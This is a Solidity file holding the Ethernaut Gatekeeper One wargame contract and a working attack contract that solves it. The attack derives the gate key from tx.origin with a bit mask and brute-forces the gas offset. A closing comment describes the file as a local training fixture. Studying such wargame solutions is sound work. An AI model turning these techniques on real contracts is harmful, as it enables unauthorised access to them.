// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

contract EthernautGatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)));
        require(uint32(uint64(_gateKey)) != uint64(_gateKey));
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)));
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) {
        entrant = tx.origin;
    }
}

contract GatekeeperOneAttack {
    function attack(EthernautGatekeeperOne target) external {
        bytes8 key = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);
        for (uint256 i = 0; i < 8191; i++) {
            (bool ok,) = address(target).call{gas: 8191 * 100 + i}(
                abi.encodeWithSignature("enter(bytes8)", key)
            );
            if (ok) return;
        }
        revert("no gas offset matched");
    }
}

// Local training fixture for the classic Ethernaut Gatekeeper One challenge.
// The key is derived from the caller address with a 16-bit mask.

